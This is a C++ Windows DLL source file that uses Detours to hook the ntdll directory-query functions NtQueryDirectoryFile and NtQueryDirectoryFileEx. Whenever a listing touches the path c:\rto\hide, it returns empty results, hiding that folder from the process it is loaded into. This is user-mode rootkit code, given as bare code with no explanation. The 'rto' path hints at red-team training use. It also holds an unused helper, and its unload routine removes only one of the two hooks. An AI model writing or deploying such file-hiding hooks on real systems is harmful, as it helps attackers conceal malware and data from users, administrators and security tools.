#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <string>
#include <vector>
#include <Winternl.h>

using namespace std;

#pragma comment(lib, "shlwapi.lib")

#define STATUS_NO_MORE_FILES 0x80000006
#define HIDE_PATH L"c:\\rto\\hide"

typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
);

typedef NTSTATUS(NTAPI* NtQueryDirectoryFileEx_t)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                 Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG                  QueryFlags,
    PUNICODE_STRING        FileName
);

NtQueryDirectoryFile_t		origNtQueryDirectoryFile = NULL;
NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx = NULL;


std::vector<wchar_t*> deserializeWCharTPointerVector(std::wstring fileName) {
    // Abrir el archivo mapeado
    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);

    // Obtener los datos serializados
    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));

    // Convertir std::wstring de nuevo a wchar_t*
    std::vector<wchar_t*> deserializedData;
    size_t pos = 0;
    wchar_t* token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = new wchar_t[pos + 1];
        wcsncpy(token, serializedData.c_str(), pos);
        token[pos] = L'\0';
        deserializedData.push_back(token);
        serializedData.erase(0, pos + 1);
    }

    if (!serializedData.empty()) {
        token = new wchar_t[serializedData.size() + 1];
        wcsncpy(token, serializedData.c_str(), serializedData.size());
        token[serializedData.size()] = L'\0';
        deserializedData.push_back(token);
    }


    return deserializedData;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    NTSTATUS status = STATUS_NO_MORE_FILES;
    WCHAR dirPath[MAX_PATH + 1] = { 0 };
    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
        if (StrStrIW(dirPath, HIDE_PATH))
            ZeroMemory(FileInformation, Length);
        else
            // otherwise - proceed with normal call
            status = origNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
    }
    return status;
}


NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
    NTSTATUS status = STATUS_NO_MORE_FILES;
    WCHAR dirPath[MAX_PATH + 1] = { 0 };

    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
        // if so, return empty structure
        if (StrStrIW(dirPath, HIDE_PATH)) {
            ZeroMemory(FileInformation, Length);
        }
        else {
            // in other case, call original function
            status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
        }
    }
    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        origNtQueryDirectoryFile = (NtQueryDirectoryFile_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFile");
        origNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFileEx");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
        DetourAttach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
        DetourTransactionCommit();
        break;
    }
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
        DetourTransactionCommit();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}
